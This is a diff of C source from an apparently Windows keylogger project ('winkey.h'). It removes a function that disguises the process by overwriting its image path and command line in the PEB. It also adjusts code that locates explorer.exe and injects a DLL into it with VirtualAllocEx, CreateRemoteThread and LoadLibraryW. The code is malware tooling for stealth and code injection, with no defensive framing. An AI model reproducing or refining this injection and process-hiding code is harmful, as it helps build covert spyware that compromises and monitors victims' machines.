@@ -1,19 +1,4 @@
-#include "../../../winkey.h"
-
-
-void hide_process(wchar_t *new_name)
-{
-	PPEB peb = GetPEB();
-	if (!peb)	
-		return;
-	PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
-	if (!params)
-		return;
-	params->ImagePathName.Buffer = (PWSTR)new_name;
-	params->ImagePathName.Length = wcslen(new_name) * sizeof(wchar_t);
-	params->CommandLine.Buffer = (PWSTR)new_name;
-	params->CommandLine.Length = wcslen(new_name) * sizeof(wchar_t);
-}
+#include "winkey.h"
 
 
 static DWORD find_pid(void)
@@ -30,7 +15,9 @@ static DWORD find_pid(void)
 	}
 	while (1)
 	{
-		if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0)
+		wchar_t wExeFile[MAX_PATH];
+		MultiByteToWideChar(CP_UTF8, 0, pe.szExeFile, -1, wExeFile, MAX_PATH);
+		if (_wcsicmp(wExeFile, L"explorer.exe") == 0)
 		{
 			DWORD pid = pe.th32ProcessID;
 			CloseHandle(snap);
@@ -68,8 +55,9 @@ int inject_into_explorer(void)
 		return 0;
 	}
 	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-	LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
-	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLibraryW,remoteMem, 0, NULL);
+	FARPROC fp = GetProcAddress(hKernel32, "LoadLibraryW");
+	LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)(void*)fp;
+	HANDLE hThread = CreateRemoteThread( hProc, NULL, 0, pLoadLibraryW, remoteMem, 0, NULL);
 	if (!hThread)
 	{
 		VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
